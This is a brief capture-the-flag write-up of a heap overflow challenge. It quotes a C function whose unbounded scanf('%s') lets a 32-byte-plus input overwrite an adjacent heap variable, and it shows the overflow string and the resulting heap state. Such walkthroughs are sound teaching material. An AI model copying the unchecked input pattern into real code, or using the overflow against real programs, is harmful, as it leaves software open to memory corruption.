`Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x609886e3a2b0  ->   pico
+-------------+----------------+
[*]   0x609886e3a2d0  ->   bico
+-------------+----------------+

`
Here is the heap state: bico is the safe_var which the challenge claims can't be changed, so the flag is released when you change bico. Pico is already changeable.

Inspect the challenge C file:
`void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
`
The key part of this is that "%s" has no input boundary checks, which means we can write a value that can overflow to the adjacent value and buffer.

This means finding the difference between the adjacent address values, then writing into pico a value that overflows into bico and disrupts that memory.

The difference is 0x20
20 in hex=32decimal
so we need 32+ or 33 characters to overflow the memory.

It works!
`Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
`
`Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x609886e3a2b0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+-------------+----------------+
[*]   0x609886e3a2d0  ->   aaaaaaaaaaaaaaaaaaaaaaaaa
+-------------+----------------+
`
You get the flag then!
